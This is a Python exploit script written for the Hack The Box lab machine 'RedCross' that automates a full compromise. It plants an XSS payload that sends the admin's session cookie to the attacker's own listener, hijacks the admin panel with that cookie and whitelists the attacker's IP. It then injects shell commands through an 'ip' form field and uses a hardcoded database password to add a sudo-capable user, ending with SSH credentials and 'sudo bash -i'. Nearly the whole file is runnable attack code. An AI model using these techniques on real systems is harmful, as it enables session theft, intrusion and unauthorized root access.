#!/usr/bin/python

# Script made for .113 redcross
# Provides user with sudo perms to SSH in as

# by brun0ne

# 1. XSS on intra. /actions.php?action=contact
# 2. Capture sent PHPSESSID cookie with webserver
# 3. Login with it into admin. panel
# 4. Whitelist IP address of tun0 on admin. /actions.php?action=Allow+IP
# 5. Add user bown with gid 27 (sudo) using postgresql with creds from actions.php
# 6. Print info

import time
import sys
import re
import textwrap
from termcolor import colored

import netifaces as ni
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

import BaseHTTPServer
import SocketServer

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

resp = ""
wait = True

debugging = False

def err(e):
	print colored("> " + e, "red", attrs=['bold'])
	sys.exit()

def succ(e):
	print colored("> " + e, "green", attrs=['bold'])

def debug(e):
	if debugging is True:
		prefix = "Debug: "
		wrapper = textwrap.TextWrapper(width=70, initial_indent=prefix, subsequent_indent=' '*len(prefix))
		
		print colored(wrapper.fill(str(e)), "blue")

try:
	IP = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr'] # set local IP addr
except:
	err("Not connected to the HTB network")

class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
	def do_GET(s): # capture get
		global resp
		global wait
		s.send_response(200)
		s.end_headers()
		resp = s.path # save requested path to resp
		wait = False
	def log_message(self, format, *args): # for silence
		pass

def getCookie():
	payload = {
		"action": "contact",
		"subject": "1",
		"body": "1",
		"cback": "<script>var i = document.createElement('img'); i.src = 'http://"+ IP + ":9090/' + document.cookie;</script>"
	}
	print colored("Sending XSS request...", "yellow")

	debug(payload)

	r = requests.post("https://intra.redcross.htb/pages/actions.php", verify=False, data=payload)
	if r.status_code == 200:
		succ("XSS request sent")
	else:
		err("XSS request couldn't be send")
	
	server_class = BaseHTTPServer.HTTPServer
	httpd = server_class(('', 9090), MyHandler)
	
	timeout = time.time() + 15 # timeout
	
	print colored("Waiting for a hit from the target...", "yellow")

	while wait:
		httpd.handle_request() # on hit it'll save path to 'resp'
		if time.time() > timeout:
			err("Timeout")
			break;
	
	debug(resp)

	cookie = re.findall(r'=(.*?);', resp)[0]

	succ("Cookie successfully stolen: " + cookie)
	return cookie

def whitelistIP(cookie):
	s = requests.Session()
	s.cookies.set("PHPSESSID", cookie)

	print colored("Trying to log in as admin...", "yellow")

	check = s.get("https://admin.redcross.htb/?page=cpanel", verify=False, allow_redirects=False)
	if check.status_code != 200:
		err("Could not log into admin panel")
	else:
		succ("Logged into admin panel")

	payload = {
		"action": "Allow IP",
		"ip": IP
	}

	print colored("Asking for access...", "yellow")
	debug(payload)

	query = s.post("https://admin.redcross.htb/pages/actions.php", verify=False, data=payload)

	if query.status_code != 200 in query.text:
		err("Could not grant access for local IP (status code " + str(query.status_code) + ")")
	else:
		if not "granted" in query.text:
			succ("Access is already granted")
		else:
			succ("Access for " + IP + " granted")
	return s # done without errors

def addSuder(s):
	payload = {
		"action": "deny",
		"id": "15",
		"ip": "1.1.1.1; echo PASSED"
	}

	print colored("Testing RCE on .admin /pages/actions.php?action=deny in param 'ip'...", "yellow")
	debug(payload)
	
	r = s.post("https://admin.redcross.htb/pages/actions.php", verify=False, data=payload)
	
	if "PASSED" not in r.text:
		err("RCE doesn't work (status code " + r.status_code + ")")
	else:
		succ("RCE works")

	debug(r.text)
	
	payload["ip"] = \
	"""1.1.1.1;export PGPASSWORD='dheu%7wjx8B&';psql -h 127.0.0.1 -U unixusrmgr -w -d unix -c "insert into passwd_table (username, passwd, gid, homedir) values ('bown', '\$1\$CT9p8Vbi\$Bulhy2F1GsiiDxMH2HxRF1', 27, '/');";echo END
	"""

	print colored("Adding user bown:onions with sudo access...", "yellow")
	debug(payload)

	r = s.post("https://admin.redcross.htb/pages/actions.php", verify=False, data=payload)

	if "INSERT 0 1" not in r.text:
		print colored("> Couldn't add user (maybe it already exists)", "red", attrs=['bold'])
	else:
		succ("User successfully added")
	
	debug(r.text)

	payload["ip"] = \
	"""1.1.1.1;export PGPASSWORD='dheu%7wjx8B&';psql -h 127.0.0.1 -U unixusrmgr -w -d unix -c "select * from passwd_table where username='bown';";echo END
	"""
	
	print colored("Checking if user exists...", "yellow")
	debug(payload)

	r = s.post("https://admin.redcross.htb/pages/actions.php", verify=False, data=payload)
	if "bown" not in r.text:
		err("User doesn't exit (status code " + r.status_code + ")")
	else:
		succ("User exists")
	debug(r.text)	
	
	return 1 # success

def main():
	if len(sys.argv) > 1:
		if sys.argv[1] == "-h": # print help
			print "Script made for .113 redcross."
			print "It accesses admin panel through XSS and creates user with sudo permissions through RCE and stealed psql password."
			print "  -d for debug"
			print "  -h for help"
			sys.exit()
		if sys.argv[1] == "-d": # debug
			global debugging
			debugging = True
			print colored("!> Running with -d debug option", "cyan", attrs=['bold'])

	cookie = getCookie()
	sess = whitelistIP(cookie)
	addSuder(sess)

	print colored("!> Done. Now SSH into 10.10.10.113 with creds:", "cyan", attrs=['bold'])
	print "   bown:onions"
	print colored("!> Then run:", "cyan", attrs=['bold'])
	print "   sudo bash -i"
	print "   (pass 'onions')"

	sys.exit()

try:
	main()
except KeyboardInterrupt:
	print "\nExiting..."
	sys.exit()


